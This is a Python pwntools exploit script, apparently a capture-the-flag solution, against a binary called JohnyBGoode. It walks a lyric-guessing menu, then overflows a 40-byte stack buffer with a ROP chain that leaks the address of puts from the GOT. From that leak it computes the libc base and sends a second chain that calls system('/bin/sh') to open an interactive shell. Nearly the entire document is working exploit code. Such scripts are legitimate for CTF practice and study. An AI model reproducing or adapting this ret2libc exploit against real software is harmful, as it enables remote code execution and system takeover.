#!/usr/bin/python3
from pwn import *
context.log_level='debug'
context.terminal = ["tmux", "splitw", "-h","-p","60"]
def find_ip(payload):
    p = process(exe, level='warn')
    p.sendlineafter(b'Please enter your name: ', b"2")
    p.sendlineafter(b'Please choose what you would like to do: ',b"2")
    p.sendlineafter(b'Enter the name of the lucky one ;): ', payload)
    p.wait()
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset
def pass_lyrics(p):
    lyrics=[b"Deep",
    b"Way", 
    b"There",
    b"Where",
    b"Who",
    b"But"]
    p.sendlineafter(b">",b"2")
    for i in range(len(lyrics)):
        var=str(p.recvuntil(lyrics[i]))
        p.sendline(var[::-1][len(lyrics[i])+3])
gdb_script = """
b* action
b* apology
b* apology+73
c
"""
exe = './JohnyBGoode'

libc = ELF("./libc.so.6", checksec=False)
#for local host libc=/lib/x86_64-linux-gnu/libc.so.6
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)

elf = context.binary = ELF(exe, checksec=False)
p=elf.process()

'''
p=remote("<ip>",port)
find_ip(cyclic(100))
offset=array_length+old_rbp=40
'''

rop=ROP(elf)
rop.call(elf.symbols["puts"],[elf.got['puts']])
rop.call(elf.symbols["apology"])

print(rop.dump())

payload=b"a"*40+rop.chain()
#gdb.attach(p,gdb_script)
pass_lyrics(p)
p.sendlineafter(b"[Marty to his parents]: ",payload)
p.recvline()
p.recvline()
print(b"string starts"+p.recvline())
leaked_puts = p.recvline()[:8].strip().ljust(8,b'\x00')
log.success ("Leaked puts@GLIBC: " + str(leaked_puts))
leaked_puts=u64(leaked_puts)
log.success(hex(leaked_puts))

libc.address = leaked_puts - libc.symbols['puts']
rop2 = ROP(libc)
rop2.system(next(libc.search(b'/bin/sh\x00')), 0, 0)
payload = b"a"*40 + rop2.chain()
p.sendlineafter(b"[Marty to his parents]: ",payload)
#gdb.attach(p,gdb_script)
p.interactive()
